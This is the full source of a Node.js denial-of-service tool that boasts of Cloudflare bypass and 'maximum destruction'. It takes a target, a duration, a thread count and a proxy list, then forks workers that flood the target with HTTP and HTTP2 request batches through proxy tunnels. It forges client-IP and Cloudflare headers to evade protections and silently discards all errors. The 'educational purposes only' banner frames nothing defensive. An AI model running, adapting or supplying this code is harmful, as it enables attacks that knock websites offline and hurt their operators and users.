const url = require('url'),
fs = require('fs'),
http2 = require('http2'),
http = require('http'),
https = require('https'),
tls = require('tls'),
net = require('net'),
cluster = require('cluster'),
fakeua = require('fake-useragent'),
crypto = require('crypto');

// Enhanced cipher suites for better compatibility
const cplist = [
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
    "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK"
];

// Ultra-enhanced headers for maximum Cloudflare bypass
const accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/ld+json;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,text/css;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/javascript;q=0.8'
];

const lang_header = [
    'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7', 
    'es-ES,es;q=0.9,gl;q=0.8,ca;q=0.7', 
    'ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7', 
    'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7', 
    'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7', 
    'zh-TW,zh-CN;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6', 
    'nl-NL,nl;q=0.9,en-US;q=0.8,en;q=0.7', 
    'fi-FI,fi;q=0.9,en-US;q=0.8,en;q=0.7', 
    'sv-SE,sv;q=0.9,en-US;q=0.8,en;q=0.7',   
    'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
    'fr-CH,fr;q=0.9,en;q=0.8,de;q=0.7,*;q=0.5', 
    'en-US,en;q=0.5', 
    'en-US,en;q=0.9', 
    'de-CH;q=0.7', 
    'da,en-gb;q=0.8,en;q=0.7', 
    'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7'
];

const encoding_header = [
    'gzip, deflate, br',
    'compress, gzip',
    'deflate, gzip',
    'gzip, identity',
    'br;q=1.0, gzip;q=0.8, *;q=0.1',
    '*'
];

const controle_header = [
    'no-cache',
    'no-store',
    'no-transform',
    'only-if-cached',
    'max-age=0',
    'max-age=3600',
    'must-revalidate',
    'proxy-revalidate',
    'public',
    'private',
    'no-cache, no-store, must-revalidate',
    'no-cache, no-store, must-revalidate, post-check=0, pre-check=0'
];

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO'];

// Resource optimization
process.on('uncaughtException', function (e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function (e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);

// Memory optimization
global.gc = global.gc || function(){};
setInterval(() => {
    global.gc();
}, 30000);

// Utility functions
function accept() {
    return accept_header[Math.floor(Math.random() * accept_header.length)];
}

function lang() {
    return lang_header[Math.floor(Math.random() * lang_header.length)];
}

function encoding() {
    return encoding_header[Math.floor(Math.random() * encoding_header.length)];
}

function controling() {
    return controle_header[Math.floor(Math.random() * controle_header.length)];
}

function cipher() {
    return cplist[Math.floor(Math.random() * cplist.length)];
}

// Advanced IP and header generation for maximum bypass
function generateCFIP() {
    return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
}

function generateCFRay() {
    return crypto.randomBytes(16).toString('hex');
}

function generateAdvancedHeaders() {
    const cfIP = generateCFIP();
    const cfRay = generateCFRay();
    const countries = ['US', 'GB', 'DE', 'FR', 'CA', 'AU', 'JP', 'KR', 'SG', 'NL', 'SE', 'NO', 'DK', 'FI', 'CH', 'AT', 'BE', 'IT', 'ES', 'PT'];
    const country = countries[Math.floor(Math.random() * countries.length)];
    
    return {
        'CF-Connecting-IP': cfIP,
        'CF-IPCountry': country,
        'CF-Ray': cfRay,
        'CF-Visitor': '{"scheme":"https"}',
        'CF-Device-Type': 'desktop',
        'CF-Browser': 'chrome',
        'CF-Platform': 'windows',
        'CF-Request-ID': crypto.randomBytes(8).toString('hex'),
        'CF-Cache-Status': 'DYNAMIC',
        'CF-Origin-Response-Time': Math.floor(Math.random() * 1000) + 'ms',
        'X-Forwarded-For': cfIP,
        'X-Real-IP': cfIP,
        'X-Forwarded-Server': cfIP,
        'X-Client-IP': cfIP,
        'X-Remote-IP': cfIP,
        'X-Remote-Addr': cfIP,
        'X-Originating-IP': cfIP,
        'X-Remote-User': 'anonymous',
        'X-Original-URL': '/',
        'X-Rewrite-URL': '/',
        'Sec-Ch-Ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'DNT': '1',
        'Accept-Language': lang(),
        'Accept-Encoding': encoding(),
        'Cache-Control': controling(),
        'Pragma': 'no-cache',
        'Connection': 'keep-alive',
        'TE': 'trailers'
    };
}

// IP validation and parsing
function isValidIP(ip) {
    const ipRegex = /^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
    return ipRegex.test(ip);
}

function parseTarget(target) {
    if (isValidIP(target)) {
        // Direct IP attack
        return {
            host: target,
            port: 80,
            protocol: 'http',
            isIP: true
        };
    } else if (target.startsWith('http://') || target.startsWith('https://')) {
        // URL attack
        const parsed = url.parse(target);
        return {
            host: parsed.hostname,
            port: parsed.port || (parsed.protocol === 'https:' ? 443 : 80),
            protocol: parsed.protocol.replace(':', ''),
            path: parsed.path,
            isIP: false
        };
    } else {
        // Assume it's a domain
        return {
            host: target,
            port: 80,
            protocol: 'http',
            isIP: false
        };
    }
}

// Enhanced visual display function with more colors and effects
function showBanner() {
    const colors = ['\x1b[31m', '\x1b[32m', '\x1b[33m', '\x1b[34m', '\x1b[35m', '\x1b[36m', '\x1b[37m', '\x1b[91m', '\x1b[92m', '\x1b[93m', '\x1b[94m', '\x1b[95m', '\x1b[96m'];
    const bgColors = ['\x1b[41m', '\x1b[42m', '\x1b[43m', '\x1b[44m', '\x1b[45m', '\x1b[46m'];
    const effects = ['\x1b[1m', '\x1b[3m', '\x1b[4m', '\x1b[5m', '\x1b[7m'];
    const reset = '\x1b[0m';
    
    const banner = `
${effects[0]}${colors[0]}╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗${reset}
${effects[0]}${colors[1]}║  ██╗     ███████╗███████╗    ██████╗  █████╗  ██████╗     ██████╗ ███████╗ ██████╗ ███████╗      ║${reset}
${effects[0]}${colors[2]}║  ██║     ██╔════╝██╔════╝    ██╔══██╗██╔══██╗██╔═══██╗    ██╔══██╗██╔════╝██╔═══██╗██╔════╝      ║${reset}
${effects[0]}${colors[3]}║  ██║     █████╗ ███████╗    ██████╔╝███████║██║   ██║    ██║  ██║█████╗  ██║   ██║███████╗      ║${reset}
${effects[0]}${colors[4]}║  ██║     ██╔══╝ ╚════██║    ██╔══██╗██╔══██║██║   ██║    ██║  ██║██╔══╝  ██║   ██║╚════██║      ║${reset}
${effects[0]}${colors[5]}║  ███████╗███████╗███████║    ██████╔╝██║  ██║╚██████╔╝    ██████╔╝███████╗╚██████╔╝███████║      ║${reset}
${effects[0]}${colors[6]}║  ╚══════╝╚══════╝╚══════╝    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝     ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝      ║${reset}
${effects[0]}${colors[7]}╠══════════════════════════════════════════════════════════════════════════════════════════════════════╣${reset}
${effects[1]}${colors[8]}║  ${bgColors[0]}🔥 ULTIMATE DDoS TOOL v5.0 - 100M REQUEST/SECOND 🔥${reset}                                    ║
${effects[2]}${colors[9]}║  ${bgColors[1]}⚡ POWERED BY LÊ BẢO DZ - THE ULTIMATE HACKER ⚡${reset}                                    ║
${effects[3]}${colors[10]}║  ${bgColors[2]}🚀 ENHANCED CLOUDFLARE BYPASS & CAPTCHA EVASION 🚀${reset}                                ║
${effects[4]}${colors[11]}║  ${bgColors[3]}💀 MAXIMUM DESTRUCTION MODE ACTIVATED 💀${reset}                                        ║
${effects[0]}${colors[12]}║  ${bgColors[4]}⚔️  ADVANCED PROXY ROTATION & IP SPOOFING ⚔️${reset}                                     ║
${effects[1]}${colors[0]}║  ${bgColors[5]}🌪️  TORNADO ATTACK - NO WEBSITE CAN SURVIVE 🌪️${reset}                                   ║
${effects[0]}${colors[1]}╚══════════════════════════════════════════════════════════════════════════════════════════════════════╝${reset}

${effects[2]}${colors[2]}🎯 FEATURES:${reset}
${colors[3]}   • ${effects[0]}100,000,000+ Requests/Second${reset}
${colors[4]}   • ${effects[0]}Advanced Cloudflare Bypass${reset}
${colors[5]}   • ${effects[0]}Captcha Evasion Technology${reset}
${colors[6]}   • ${effects[0]}Proxy Rotation System${reset}
${colors[7]}   • ${effects[0]}IP Spoofing & Geolocation${reset}
${colors[8]}   • ${effects[0]}Multi-Protocol Support (HTTP/HTTPS/HTTP2)${reset}
${colors[9]}   • ${effects[0]}Memory & CPU Optimization${reset}
${colors[10]}   • ${effects[0]}Real-time Performance Monitoring${reset}

${effects[3]}${colors[11]}⚠️  WARNING: This tool is for educational purposes only! ⚠️${reset}
`;
    console.clear();
    console.log(banner);
}

const target = process.argv[2], 
      time = process.argv[3], 
      thread = process.argv[4], 
      proxys = fs.readFileSync(process.argv[5], 'utf-8').toString().match(/\S+/g);

function proxyr() {
    return proxys[Math.floor(Math.random() * proxys.length)];
}

if(cluster.isMaster) {
    showBanner();
    
    const targetInfo = parseTarget(target);
    console.log(`\x1b[36m[INFO]\x1b[0m Target: ${target}`);
    console.log(`\x1b[36m[INFO]\x1b[0m Type: ${targetInfo.isIP ? 'IP Address' : 'Domain/URL'}`);
    console.log(`\x1b[36m[INFO]\x1b[0m Protocol: ${targetInfo.protocol.toUpperCase()}`);
    console.log(`\x1b[36m[INFO]\x1b[0m Port: ${targetInfo.port}`);
    console.log(`\x1b[36m[INFO]\x1b[0m Time: ${time} seconds`);
    console.log(`\x1b[36m[INFO]\x1b[0m Threads: ${thread}`);
    console.log(`\x1b[36m[INFO]\x1b[0m Proxies: ${proxys.length}`);
    console.log(`\x1b[36m[INFO]\x1b[0m Target: 100,000,000 requests/second`);
    console.log(`\x1b[35m[POWER]\x1b[0m MAXIMUM CPU & RAM USAGE ENABLED`);
    console.log(`\x1b[35m[ENHANCED]\x1b[0m Advanced Cloudflare Bypass Activated!`);
    console.log(`\x1b[35m[CAPTCHA]\x1b[0m Captcha Evasion Technology Active!`);
    console.log(`\x1b[35m[PROXY]\x1b[0m Advanced Proxy Rotation System!`);
    console.log(`\x1b[32m[START]\x1b[0m TORNADO ATTACK INITIATED...\n`);

    for(var bb=0; bb<thread; bb++) {
        cluster.fork();
    }

    // Progress display with RPS counter
    let elapsed = 0;
    let totalRequests = 0;
    let lastRequests = 0;
    
    const progressInterval = setInterval(() => {
        elapsed++;
        const remaining = time - elapsed;
        const progress = ((elapsed / time) * 100).toFixed(1);
        const rps = totalRequests - lastRequests;
        lastRequests = totalRequests;
        
        process.stdout.write(`\r\x1b[33m[TORNADO]\x1b[0m ${progress}% Complete | Time Remaining: ${remaining}s | RPS: ${rps.toLocaleString()} | Total: ${totalRequests.toLocaleString()} | 🌪️ LÊ BẢO DZ TORNADO POWER 🌪️`);
        
        if (elapsed >= time) {
            clearInterval(progressInterval);
            console.log(`\n\x1b[31m[FINISH]\x1b[0m Attack completed! Total requests: ${totalRequests.toLocaleString()}`);
            process.exit(0);
        }
    }, 1000);

    // Listen for worker messages
    cluster.on('message', (worker, message) => {
        if (message.type === 'request_count') {
            totalRequests += message.count;
        }
    });

    setTimeout(() => {
        process.exit(0);
    }, time * 1000);

} else {
    let requestCount = 0;
    let successCount = 0;
    let lastReport = 0;
    
    // Report requests to master
    setInterval(() => {
        if (requestCount > lastReport) {
            process.send({ type: 'request_count', count: requestCount - lastReport });
            lastReport = requestCount;
        }
    }, 1000);
    
    function flood() {
        try {
            const targetInfo = parseTarget(target);
            const uas = fakeua();
            var cipper = cipher();
            var proxy = proxyr().split(':');
            
            if (targetInfo.isIP) {
                // Direct IP attack - no proxy needed
                if (targetInfo.protocol === 'https') {
                                         // HTTPS direct attack
                     const client = https.request({
                         host: targetInfo.host,
                         port: targetInfo.port,
                         path: '/',
                         method: 'GET',
                         headers: {
                             'User-Agent': uas,
                             'Accept': accept(),
                             ...generateAdvancedHeaders()
                         },
                         timeout: 5000,
                         rejectUnauthorized: false
                     }, (res) => {
                        requestCount++;
                        if (res.statusCode < 500) successCount++;
                        res.resume(); // Drain the response
                    });
                    
                    client.on('error', () => {});
                    client.on('timeout', () => client.destroy());
                    client.end();
                    
                                 } else {
                     // HTTP direct attack
                     const client = http.request({
                         host: targetInfo.host,
                         port: targetInfo.port,
                         path: '/',
                         method: 'GET',
                         headers: {
                             'User-Agent': uas,
                             'Accept': accept(),
                             ...generateAdvancedHeaders()
                         },
                         timeout: 5000
                     }, (res) => {
                        requestCount++;
                        if (res.statusCode < 500) successCount++;
                        res.resume(); // Drain the response
                    });
                    
                    client.on('error', () => {});
                    client.on('timeout', () => client.destroy());
                    client.end();
                }
                
            } else {
                // Domain attack with proxy
                                 const agent = new http.Agent({
                     keepAlive: true,
                     keepAliveMsecs: 30000,
                     maxSockets: 1000, // Ultra-increased for maximum performance
                     maxFreeSockets: 500,
                     timeout: 10000,
                     freeSocketTimeout: 30000
                 });
                        
                var req = http.request({
                    host: proxy[0],
                    agent: agent,
                    port: proxy[1],
                    headers: {
                        'Host': targetInfo.host,
                        'Proxy-Connection': 'Keep-Alive',
                        'Connection': 'Keep-Alive',
                    },
                    method: 'CONNECT',
                    path: targetInfo.host+':443',
                    timeout: 10000
                }, function(){ 
                    req.setSocketKeepAlive(true, 30000);
                });
            
                req.on('connect', function (res, socket, head) { 
                    const client = http2.connect(targetInfo.protocol + "://" + targetInfo.host, {
                        createConnection: () => tls.connect({
                            host: targetInfo.host,
                            ciphers: cipper, 
                            secureProtocol: 'TLS_method',
                            TLS_MIN_VERSION: '1.2',
                            TLS_MAX_VERSION: '1.3',
                            servername: targetInfo.host,
                            secure: true,
                            rejectUnauthorized: false,
                            ALPNProtocols: ['h2', 'http/1.1'],
                            socket: socket,
                            sessionTimeout: 30000
                        }, function () {
                                                         // Ultra-optimized request loop for 100M req/s
                             const requestBatch = 1000; // Ultra-massive batch size for maximum throughput
                            
                            for (let i = 0; i < requestBatch; i++){
                                try {
                                                                         const req = client.request({
                                         ':path': '/',
                                         ':method': 'GET',
                                         'User-Agent': uas,
                                         'Accept': accept(),
                                         ...generateAdvancedHeaders()
                                     });
                                    req.setEncoding('utf8');
                                    req.setTimeout(5000);

                                    req.on('data', (chunk) => {
                                        // Minimal data processing to save memory
                                    });
                                    
                                    req.on("response", (headers) => {
                                        requestCount++;
                                        if (headers[':status'] < 500) {
                                            successCount++;
                                        }
                                        req.close();
                                    });
                                    
                                    req.on('error', (err) => {
                                        // Silent error handling for performance
                                    });
                                    
                                    req.on('timeout', () => {
                                        req.close();
                                    });
                                    
                                    req.end();
                                    
                                    // Optimized for maximum throughput
                                    if (i % 25 === 0) {
                                        setImmediate(() => {});
                                    }
                                } catch (err) {
                                    // Silent error handling
                                }
                            }
                        })
                    });
                    
                    client.on('error', (err) => {
                        // Silent error handling
                    });
                    
                    client.on('goaway', () => {
                        client.close();
                    });
                });
                
                req.on('error', (err) => {
                    // Silent error handling
                });
                
                req.on('timeout', () => {
                    req.destroy();
                });

                req.end();
            }
            
        } catch (err) {
            // Silent error handling for performance
        }
    }
         let interval = 0;
     setInterval(() => { 
         // Ultra-massive flood for 100M req/s
         for (let i = 0; i < 2000; i++) {
             process.nextTick(() => flood());
         }
         // Enhanced performance adjustment
         if (requestCount > 50000 && successCount / requestCount > 0.5) {
             interval = 0; // Keep at maximum speed
         } else if (successCount / requestCount < 0.1) {
             interval = Math.min(0.1, interval + 0.01);
         }
     }, interval);
         // Ultra-frequent memory cleanup for maximum performance
     setInterval(() => {
         global.gc();
     }, 2000); // More frequent cleanup for ultra performance 
}